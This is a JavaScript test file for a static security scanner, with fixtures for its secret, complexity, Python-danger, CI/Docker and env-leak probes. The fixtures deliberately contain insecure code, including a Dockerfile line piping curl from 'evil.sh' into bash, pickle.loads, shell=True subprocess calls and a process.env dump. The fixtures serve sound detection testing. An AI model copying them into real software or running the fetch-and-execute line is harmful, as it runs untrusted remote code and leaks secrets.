// Extra probe coverage: entropy-secrets, complexity, python-danger, ci-docker, env-leak.
// Ground-truth fixtures for the probes added after the initial layer-1 set.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { scan } from '../src/index.js';

async function repo(files) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'alltest-px-'));
  for (const [name, content] of Object.entries(files)) {
    const p = path.join(dir, name);
    await fs.mkdir(path.dirname(p), { recursive: true });
    await fs.writeFile(p, content);
  }
  return dir;
}
const rules = (r) => new Set(r.findings.map((f) => f.ruleId));

test('entropy-secrets catches an unknown-format high-entropy token', async () => {
  const dir = await repo({ 'a.js': 'const sessionToken = "Zx9Kq2Lm8Wp3Rt6Yv1Bn4Cs5EhAj7Df0Gk";\n' });
  const r = await scan({ root: dir, probes: ['static/entropy-secrets'] });
  assert.ok(rules(r).has('high-entropy-secret'), 'should flag high-entropy secret-named token');
});

test('entropy-secrets suppresses hashes and does not redact-leak', async () => {
  const dir = await repo({
    'a.js': 'const gitSha = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";\n',
  });
  const r = await scan({ root: dir, probes: ['static/entropy-secrets'] });
  assert.equal(r.findings.length, 0, 'a named git SHA is not a secret');
});

test('entropy-secrets redacts the token in its snippet', async () => {
  const dir = await repo({ 'a.js': 'const apiKey = "Zx9Kq2Lm8Wp3Rt6Yv1Bn4Cs5EhAj7Df0Gk";\n' });
  const r = await scan({ root: dir, probes: ['static/entropy-secrets'] });
  const f = r.findings.find((x) => x.ruleId === 'high-entropy-secret');
  assert.ok(f, 'flagged');
  assert.ok(!f.snippet.includes('Zx9Kq2Lm8Wp3Rt6Yv1Bn4Cs5EhAj7Df0Gk'), 'raw secret must be redacted from snippet');
  assert.ok(f.snippet.includes('redacted'), 'shows redaction marker');
});

test('complexity flags a high-cyclomatic function', async () => {
  const branches = Array.from({ length: 30 }, (_, i) => `  if (x === ${i}) return ${i};`).join('\n');
  const dir = await repo({ 'a.js': `function big(x) {\n${branches}\n  return -1;\n}\n` });
  const r = await scan({ root: dir, probes: ['static/complexity'] });
  assert.ok(rules(r).has('high-cyclomatic-complexity'), 'a 30-branch function is high complexity');
});

test('complexity does NOT flag a simple function', async () => {
  const dir = await repo({ 'a.js': 'function add(a, b) {\n  return a + b;\n}\n' });
  const r = await scan({ root: dir, probes: ['static/complexity'] });
  assert.equal(r.findings.length, 0, 'trivial function is clean');
});

test('complexity does not miscount keywords inside string/regex literals', async () => {
  // A function whose only "if/for" are inside strings must be low complexity.
  const dir = await repo({
    'a.js': 'function f() {\n  const s = "if for while if for while and or";\n  const re = /if|for|while/;\n  return s + re;\n}\n',
  });
  const r = await scan({ root: dir, probes: ['static/complexity'] });
  assert.equal(r.findings.filter((x) => x.ruleId === 'high-cyclomatic-complexity').length, 0, 'string/regex keywords must not inflate complexity');
});

test('python-danger catches deserialization + shell risks', async () => {
  const dir = await repo({
    'app.py': [
      'import yaml, pickle, subprocess',
      'data = yaml.load(open("f"))',
      'obj = pickle.loads(blob)',
      'subprocess.run(cmd, shell=True)',
      'requests.get(url, verify=False)',
    ].join('\n') + '\n',
  });
  const r = await scan({ root: dir, probes: ['static/python-danger'] });
  const rs = rules(r);
  for (const id of ['py-yaml-load', 'py-pickle-load', 'py-subprocess-shell', 'py-requests-noverify']) {
    assert.ok(rs.has(id), `expected ${id}`);
  }
});

test('ci-docker catches curl|bash and unpinned actions', async () => {
  const dir = await repo({
    'Dockerfile': 'FROM node:latest\nRUN curl https://evil.sh | bash\nUSER root\n',
    '.github/workflows/ci.yml': 'on: push\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n',
  });
  const r = await scan({ root: dir, probes: ['static/ci-docker'] });
  const rs = rules(r);
  assert.ok(rs.has('docker-curl-bash'), 'curl|bash in Dockerfile');
  assert.ok(rs.has('docker-latest-tag'), ':latest base image');
});

test('env-leak catches error/stack disclosure and process.env dump', async () => {
  const dir = await repo({
    'server.js': [
      'app.get("/x", (req, res) => {',
      '  res.status(500).json({ error: err.message });',
      '  res.send(process.env);',
      '});',
    ].join('\n') + '\n',
  });
  const r = await scan({ root: dir, probes: ['static/env-leak'] });
  assert.ok(rules(r).has('error-message-to-response') || rules(r).has('env-dump'), 'catches info disclosure');
});
